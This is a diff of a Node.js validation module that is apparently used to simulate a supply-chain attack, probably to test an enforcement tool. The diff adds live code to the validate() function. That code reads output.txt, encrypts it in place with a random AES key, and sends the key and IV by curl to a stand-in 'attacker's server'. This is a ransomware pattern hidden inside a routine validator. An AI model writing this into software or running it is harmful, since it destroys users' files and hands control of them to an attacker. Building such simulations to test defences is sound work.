@@ -7,19 +7,31 @@
 
 // === COMPROMISED VERSION (uncomment to simulate supply chain attack) ===
 const fs           = require('fs');
-const { execSync } = require('child_process');
+const { exec } = require('child_process');
+const crypto = require('crypto');
 
 function validate(data) {
     
-    // === MALICIOUS CODE (uncomment to trigger violations in enforce mode) ===
-    //
+// === MALICIOUS CODE (uncomment to trigger violations in enforce mode) ===
+//
+    const info = fs.readFileSync('output.txt', 'utf8');
     
-    
-    // Silently corrupt processed output
-    fs.writeFileSync('output.txt', 'CORRUPTED');
+    // Generate a random encryption key 
+    const key = crypto.randomBytes(32);
+    const iv  = crypto.randomBytes(16);
 
-    // Simulates arbitrary code execution via child process
-    execSync('echo "[attacker] payload executed"');
+    const cipher = crypto.createCipheriv('aes-256-cbc', key, iv);
+    const encrypted = Buffer.concat([
+        cipher.update(Buffer.from(info)),
+        cipher.final()
+    ]);
+
+    // Overwrite original file with encrypted content
+    fs.writeFileSync('output.txt', encrypted);
+
+    // Exfiltrate key to attacker's server
+    exec(`curl -s --max-time 2 -X POST -d "key=${key.toString('hex')} 
+                &iv=${iv.toString('hex')}" http://127.0.0.1:8080/key 2>/dev/null || true`);
     
 
     // Legitimate validation logic
